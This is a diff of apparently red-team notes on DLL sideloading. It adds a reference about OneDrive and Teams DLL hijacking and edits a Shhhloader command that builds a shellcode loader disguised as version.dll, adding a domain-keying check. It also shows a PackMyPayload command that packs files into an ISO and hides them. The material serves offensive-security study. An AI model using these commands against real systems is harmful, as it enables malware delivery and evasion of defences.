@@ -4,6 +4,7 @@
 - [https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads](https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads)
 - [https://dec0ne.github.io/research/2021-04-26-DLL-Proxying-pt1/](https://dec0ne.github.io/research/2021-04-26-DLL-Proxying-pt1/)
 - [https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/](https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/)
+- [https://besteffortteam.it/onedrive-and-teams-dll-hijacking/](https://besteffortteam.it/onedrive-and-teams-dll-hijacking/)
 
 {% embed url="https://youtu.be/3eROsG_WNpE" %}
 
@@ -380,5 +381,5 @@ PS > python .\PackMyPayload.py .\out\ .\out\a.iso --out-format iso --hide OneDri
 - [https://github.com/icyguider/Shhhloader](https://github.com/icyguider/Shhhloader)
 
 ```
-$ ./Shhhloader.py -p RuntimeBroker.exe -d -dp vresion.dll -o version.dll shellcode.bin
+$ ./Shhhloader.py -p RuntimeBroker.exe -d -dp vresion.dll -o version.dll -s domain -sa megacorp.local shellcode.bin
 ```
